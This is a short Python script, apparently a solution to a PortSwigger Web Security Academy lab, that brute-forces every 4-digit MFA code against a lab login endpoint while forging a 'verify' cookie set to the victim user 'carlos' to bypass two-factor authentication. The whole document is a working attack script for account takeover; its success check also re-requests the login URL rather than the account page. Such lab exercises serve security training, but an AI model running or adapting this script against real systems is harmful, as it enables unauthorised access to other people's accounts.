import requests

# Target URL
url = "https://0a72000503b274f58041a3bd00c90066.web-security-academy.net/login2"

# Session and verify cookies
cookies = {
    "verify": "carlos",
    "session": "fdX9vdNcktCvXc8eMmqNgPWwE0TncyLL"
}

# Common headers to mimic a real browser
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Try all 4-digit codes
for i in range(10000):
    code = f"{i:04d}"
    data = {
        "mfa-code": code
    }

    print(f"[*] Trying code: {code}")
    response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)

    print(f"    Status: {response.status_code}")

    # Check for 302 redirect as signal of success
    if response.status_code == 302:
        print(f"[+] Code {code} triggered a 302 redirect!")
        # Optionally follow the redirect to confirm the presence of "My Account"
        follow_up = requests.get(url, headers=headers, cookies=cookies)
        if "My Account" in follow_up.text:
            print(f"[✓] SUCCESS! Correct code: {code}")
            break
        else:
            print(f"    302 received but 'My Account' not found. Continuing...")

else:
    print("[x] Finished all attempts. Code not found.")
